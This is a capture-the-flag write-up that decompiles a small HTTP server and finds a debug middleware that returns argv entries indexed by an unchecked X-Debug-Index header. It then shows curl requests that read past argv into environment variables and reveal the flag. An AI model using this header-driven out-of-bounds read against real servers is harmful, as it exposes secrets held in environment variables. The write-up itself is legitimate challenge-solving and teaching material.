```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE akane_server[240]; // [rsp+10h] [rbp-210h] BYREF
  _BYTE str_static[47]; // [rsp+100h] [rbp-120h] BYREF
  char v6; // [rsp+12Fh] [rbp-F1h] BYREF
  struct_response_obj response_1; // [rsp+130h] [rbp-F0h] BYREF
  char v8; // [rsp+15Fh] [rbp-C1h] BYREF
  _BYTE endpoint[43]; // [rsp+160h] [rbp-C0h] BYREF
  char v10; // [rsp+18Bh] [rbp-95h] BYREF
  int _true; // [rsp+18Ch] [rbp-94h] BYREF
  _BYTE response_2[40]; // [rsp+190h] [rbp-90h] BYREF
  const char **argv_1; // [rsp+1B8h] [rbp-68h] BYREF
  _BYTE address[47]; // [rsp+1C0h] [rbp-60h] BYREF
  char v15; // [rsp+1EFh] [rbp-31h] BYREF
  char *v16; // [rsp+1F0h] [rbp-30h]
  char *v17; // [rsp+1F8h] [rbp-28h]
  char *v18; // [rsp+200h] [rbp-20h]

  // create server
  akane::create_server((akane *)akane_server);
  // thread pool size = 4
  akane::Server::set_thread_pool_size((akane::Server *)akane_server, 4u);
  v18 = &v6;
  // static dir = 'static'
  std::string::basic_string<std::allocator<char>>(str_static, "static", &v6);
  akane::Server::set_static_directory(akane_server, str_static);
  std::string::~string(str_static);
  // endpoint '/' = lambda 1
  // lambda 1 is just an informational: a welcome message and a version number as nlohmann json
  std::function<akane::Response ()(akane::Context &)>::function<main::{lambda(akane::Context &)#1},void>(
    &response_1,
    (__int64)&v8);
  v17 = &v10;
  std::string::basic_string<std::allocator<char>>(endpoint, "/", &v10);
  akane::Server::get((__int64)akane_server, (__int64)endpoint, (__int64)&response_1);
  std::string::~string(endpoint);
  std::function<akane::Response ()(akane::Context &)>::~function(&response_1);
  // activate logger
  _true = 1;
  akane::Server::use<akane::Logger,akane::Logger::Level>(akane_server, &_true);
  // set lambda 2 as middleware?
  argv_1 = argv;
  std::function<bool ()(akane::Context &)>::function<main::{lambda(akane::Context &)#2},void>(
    (std::_Function_base *)response_2,
    (__int64)&argv_1);
  akane::Server::use(akane_server, response_2);
  std::function<bool ()(akane::Context &)>::~function(response_2);
  // bind address to 0.0.0.0
  v16 = &v15;
  std::string::basic_string<std::allocator<char>>(address, "0.0.0.0", &v15);
  akane::Server::bind(akane_server, address, 5000);
  std::string::~string(address);
  akane::Server::start((akane::Server *)akane_server);
  akane::Server::~Server((akane::Server *)akane_server);
  return 0;
}
```

Lesson learned: things like `std::function<akane::Response ()(akane::Context &)>::function<main::{lambda(akane::Context &)#1},void>` is just a wrapper.
Instead, look into the actual code function, in this case, `main::{lambda(akane::Context &)#1},void`.
Looking at the function list in IDA Pro, I found `main::{lambda(akane::Context &)#1}::operator()`.

```c
__int64 __fastcall main::{lambda(akane::Context &)#1}::operator()(__int64 a1)
{
  __int64 v1; // r9
  _BYTE *i; // rbx
  __int64 *j; // rbx
  _BYTE *k; // rbx
  _BYTE v6[16]; // [rsp+50h] [rbp-D0h] BYREF
  _BYTE v7[24]; // [rsp+60h] [rbp-C0h] BYREF
  __int64 v8; // [rsp+78h] [rbp-A8h] BYREF
  _BYTE message[24]; // [rsp+90h] [rbp-90h] BYREF
  __int64 welcome; // [rsp+A8h] [rbp-78h] BYREF
  _BYTE version[24]; // [rsp+C0h] [rbp-60h] BYREF
  __int64 version_value; // [rsp+D8h] [rbp-48h] BYREF
  __int64 v13; // [rsp+F0h] [rbp-30h] BYREF

  nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::json_ref<char const(&)[8],0>(
    message,
    "message");
  nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::json_ref<char const(&)[30],0>(
    &welcome,
    "Welcome to Akane HTTP Server!");
  nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::json_ref(
    v7,
    message,
    2);
  nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::json_ref<char const(&)[8],0>(
    version,
    "version");
  nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::json_ref<char const(&)[6],0>(
    &version_value,
    "1.0.0");
  nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::json_ref(
    &v8,
    version,
    2);
  nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>::basic_json(
    v6,
    v7,
    2,
    1,
    2,
    v1,
    v7,
    2);
  akane::Response::Response(a1, v6);
  nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>::~basic_json(v6);
  // look for 'message'
  for ( i = message;
        i != v7;
        nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::~json_ref(i) )
  {
    i -= 24;
  }
  for ( j = &v13;
        j != (__int64 *)version;
        nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::~json_ref(j) )
  {
    j -= 3;
  }
  for ( k = version;
        k != message;
        nlohmann::json_abi_v3_11_3::detail::json_ref<nlohmann::json_abi_v3_11_3::basic_json<std::map,std::vector,std::string,bool,long,unsigned long,double,std::allocator,nlohmann::json_abi_v3_11_3::adl_serializer,std::vector<unsigned char>,void>>::~json_ref(k) )
  {
    k -= 24;
  }
  return a1;
}
```

However, there's nothing intesting in the first lambda, so I looked at the second.

```c
__int64 __fastcall main::{lambda(akane::Context &)#2}::operator()(_QWORD *a1, __int64 request)
{
  char __3; // r13
  char __2; // r14
  char __6; // r13
  char __7; // r14
  akane::Response *v7; // rax
  bool is_not_xdebug; // [rsp+8h] [rbp-1C8h]
  bool is_not_xdebugidx; // [rsp+8h] [rbp-1C8h]
  _BYTE xdebug[47]; // [rsp+20h] [rbp-1B0h] BYREF
  char _; // [rsp+4Fh] [rbp-181h] BYREF
  _BYTE xdebug_val[32]; // [rsp+50h] [rbp-180h] BYREF
  _BYTE xdebug_1[47]; // [rsp+70h] [rbp-160h] BYREF
  char __5; // [rsp+9Fh] [rbp-131h] BYREF
  _BYTE xdebugidx[47]; // [rsp+A0h] [rbp-130h] BYREF
  char __9; // [rsp+CFh] [rbp-101h] BYREF
  _BYTE xdebugidx_val[32]; // [rsp+D0h] [rbp-100h] BYREF
  _BYTE xdebugidx_1[47]; // [rsp+F0h] [rbp-E0h] BYREF
  char __11; // [rsp+11Fh] [rbp-B1h] BYREF
  _BYTE v20[32]; // [rsp+120h] [rbp-B0h] BYREF
  _BYTE xdebugidx_2[47]; // [rsp+140h] [rbp-90h] BYREF
  char __13; // [rsp+16Fh] [rbp-61h] BYREF
  char *__12; // [rsp+170h] [rbp-60h]
  char *__10; // [rsp+178h] [rbp-58h]
  char *__8; // [rsp+180h] [rbp-50h]
  char *__4; // [rsp+188h] [rbp-48h]
  char *__1; // [rsp+190h] [rbp-40h]
  int v28; // [rsp+19Ch] [rbp-34h]

  // X-Debug: true
  __3 = 0;
  __2 = 0;
  __1 = &_;
  std::string::basic_string<std::allocator<char>>(xdebug, "X-Debug", &_);
  is_not_xdebug = 1;
  if ( (unsigned __int8)akane::Request::has_header(request, xdebug) == 1 )
  {
    __4 = &__5;
    std::string::basic_string<std::allocator<char>>(xdebug_1, "X-Debug", &__5);
    __3 = 1;
    akane::Request::header((__int64)xdebug_val, request, (__int64)xdebug_1);// presumably get header value
    __2 = 1;
    if ( (unsigned __int8)std::operator==<char>(xdebug_val, "true") == 1 )
      is_not_xdebug = 0;
  }
  if ( __2 )
    std::string::~string(xdebug_val);
  if ( __3 )
    std::string::~string(xdebug_1);
  std::string::~string(xdebug);
  if ( is_not_xdebug )
    return 1;
  // X-Debug-Index = [0-9]
  __6 = 0;
  __7 = 0;
  __8 = &__9;
  std::string::basic_string<std::allocator<char>>(xdebugidx, "X-Debug-Index", &__9);
  is_not_xdebugidx = 1;
  if ( (unsigned __int8)akane::Request::has_header(request, xdebugidx) == 1 )
  {
    __10 = &__11;
    std::string::basic_string<std::allocator<char>>(xdebugidx_1, "X-Debug-Index", &__11);
    __6 = 1;
    akane::Request::header((__int64)xdebugidx_val, request, (__int64)xdebugidx_1);
    __7 = 1;
    if ( *(char *)std::string::operator[](xdebugidx_val, 0) - (unsigned int)'0' <= 9 )
      is_not_xdebugidx = 0;
  }
  if ( __7 )
    std::string::~string(xdebugidx_val);
  if ( __6 )
    std::string::~string(xdebugidx_1);
  std::string::~string(xdebugidx);
  if ( is_not_xdebugidx )
    return 1;
  // get argv with index of X-Debug-Index
  // there's no bound checking, and you can get server to return environment variables instead
  __12 = &__13;
  std::string::basic_string<std::allocator<char>>(xdebugidx_2, "X-Debug-Index", &__13);
  akane::Request::header((__int64)v20, request, (__int64)xdebugidx_2);
  v28 = std::stoi(v20, 0, 10);
  std::string::~string(v20);
  std::string::~string(xdebugidx_2);
  v7 = (akane::Response *)akane::Response::setStatus(request + 552, 200);
  akane::Response::setBody(v7, *(const char **)(8LL * v28 + *a1));
  return 0;
}
```

Seems like the code looks for certain headers to be set to certain values.
I then tried curl with the appropriate header according to the code.

```
 $ curl -H 'X-Debug: true' -H 'X-Debug-Index: 0' gzcli.1pc.tf:32785                                                                                                                                                          08:21:41 
./main
 $ curl -H 'X-Debug: true' -H 'X-Debug-Index: 1' gzcli.1pc.tf:32785                                                                                                                                                          08:22:16 
Internal Server Error
 $ curl -H 'X-Debug: true' -H 'X-Debug-Index: 2' gzcli.1pc.tf:32785                                                                                                                                                          08:22:19 
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 $ curl -H 'X-Debug: true' -H 'X-Debug-Index: 3' gzcli.1pc.tf:32785                                                                                                                                                          08:22:22 
HOSTNAME=84336b115061
 $ curl -H 'X-Debug: true' -H 'X-Debug-Index: 4' gzcli.1pc.tf:32785                                                                                                                                                          08:22:25 
GZCTF_TEAM_ID=11
 $ curl -H 'X-Debug: true' -H 'X-Debug-Index: 5' gzcli.1pc.tf:32785                                                                                                                                                          08:22:27 
FLAG=INTECHFEST{5535061c77c5e85ae66420f016fbbc08}
```
